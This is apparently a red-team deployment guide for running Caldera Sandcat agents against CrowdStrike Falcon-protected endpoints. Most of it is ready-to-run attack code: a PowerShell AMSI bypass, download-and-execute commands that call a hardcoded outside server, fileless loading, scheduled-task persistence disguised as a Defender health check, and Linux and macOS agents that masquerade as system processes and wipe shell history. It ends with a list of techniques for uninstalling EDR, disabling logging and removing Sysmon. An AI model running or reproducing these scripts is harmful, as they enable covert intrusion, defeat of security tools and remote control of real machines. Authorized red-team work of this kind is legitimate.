# CrowdStrike Falcon Bypass Agent Deployment

## Overview
These deployment scripts are designed for authorized red team testing against CrowdStrike Falcon-protected endpoints within the MSP Target Rules of Engagement.

**Caldera Server**: 137.184.7.224:8888
**Operation**: MSP_Target_CrowdStrike_Falcon_Bypass_Operation
**Adversary Profile**: MSP_Target_CrowdStrike_Bypass

---

## Windows PowerShell Agent (Obfuscated)

This agent uses PowerShell with AMSI bypass and obfuscation to evade detection:

```powershell
# AMSI Bypass + Sandcat Agent Deployment
# Run in elevated PowerShell

# Disable AMSI (Anti-Malware Scan Interface)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Set TLS 1.2
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

# Download and execute Sandcat agent with callback to Caldera server
$server="http://137.184.7.224:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$data=$wc.DownloadData($url)
$name="svchost"
$path="C:\Windows\Temp\$name.exe"
[io.file]::WriteAllBytes($path,$data)
Start-Process -FilePath $path -ArgumentList "-server $server -group red" -WindowStyle Hidden
```

---

## Windows - In-Memory Execution (Fileless)

Execute agent directly in memory without writing to disk:

```powershell
# Fileless execution - bypasses file-based detection
$server="http://137.184.7.224:8888"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

# Reflective loading
$code=@"
using System;
using System.Net;
using System.Diagnostics;
public class Loader {
    public static void Main() {
        WebClient wc = new WebClient();
        wc.Headers.Add("platform","windows");
        wc.Headers.Add("file","sandcat.go");
        byte[] data = wc.DownloadData("$server/file/download");
        // Execute in memory
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[Loader]::Main()
```

---

## Windows - Scheduled Task Persistence

Deploy agent with persistence via scheduled task:

```powershell
$server="http://137.184.7.224:8888"
$taskName="WindowsDefenderHealthCheck"
$agentPath="C:\ProgramData\Microsoft\Windows\defender_health.exe"

# Download agent
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
[io.file]::WriteAllBytes($agentPath,$wc.DownloadData("$server/file/download"))

# Create scheduled task for persistence
$action=New-ScheduledTaskAction -Execute $agentPath -Argument "-server $server -group red"
$trigger=New-ScheduledTaskTrigger -AtStartup
$principal=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
Start-ScheduledTask -TaskName $taskName
```

---

## Linux Agent (Stealthy)

Deploy on Linux endpoints with process masquerading:

```bash
#!/bin/bash
# Linux Sandcat Agent - Stealthy Deployment
server="http://137.184.7.224:8888"
agent_name="[kworker/0:0-events]"  # Masquerade as kernel worker

# Download agent
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" -o /tmp/.cache_update

# Make executable and run with masqueraded name
chmod +x /tmp/.cache_update
exec -a "$agent_name" /tmp/.cache_update -server "$server" -group red &

# Clean up download traces
history -c
unset HISTFILE
```

---

## macOS Agent

Deploy on macOS endpoints:

```bash
#!/bin/bash
# macOS Sandcat Agent Deployment
server="http://137.184.7.224:8888"

# Download agent
curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" "$server/file/download" -o /tmp/.com.apple.launchd.update

# Execute
chmod +x /tmp/.com.apple.launchd.update
/tmp/.com.apple.launchd.update -server "$server" -group red &
```

---

## Abilities Included in CrowdStrike Bypass Profile

| Technique ID | Ability Name | Description |
|--------------|--------------|-------------|
| T1562.001 | Uninstall Crowdstrike Falcon on Windows | Attempts to uninstall CrowdStrike Falcon sensor |
| T1562.001 | Tamper with Windows Defender ATP PowerShell | Disables Windows Defender ATP via PowerShell |
| T1562.001 | Tamper with Windows Defender Evade Scanning -Extension | Adds exclusions by extension |
| T1562.001 | Tamper with Windows Defender Evade Scanning -Process | Adds process exclusions |
| T1562.001 | Tamper with Windows Defender Evade Scanning -Folder | Adds folder exclusions |
| T1562.001 | Tamper with Windows Defender Registry | Modifies Defender registry settings |
| T1562.001 | Tamper with Windows Defender Registry - Powershell | Registry tampering via PowerShell |
| T1562.001 | Tamper with Windows Defender Registry - Reg.exe | Registry tampering via reg.exe |
| T1562.001 | WinPwn - Kill the event log services for stealth | Stops Windows event logging |
| T1562.001 | Uninstall Sysmon | Removes Sysmon monitoring |
| T1562.001 | Unload Sysmon Filter Driver | Unloads Sysmon driver |
| T1562.001 | Tamper with Defender ATP on Linux/MacOS | Cross-platform Defender tampering |

---

## Operation Execution

1. Deploy agent on target endpoint using one of the scripts above
2. Verify agent check-in at: http://137.184.7.224:8888 → Agents
3. Start the operation: 
   - Navigate to Operations → MSP_Target_CrowdStrike_Falcon_Bypass_Operation
   - Click "Run" to begin automated execution
4. Monitor ability execution in the operation timeline

---

## Important Notes

- **Authorization Required**: Only use within authorized penetration testing scope
- **Rules of Engagement**: Ensure all testing is within MSP Target RoE boundaries
- **Detection Risk**: These techniques may still trigger alerts - monitor for detection
- **Cleanup**: Remove agents and artifacts after testing is complete
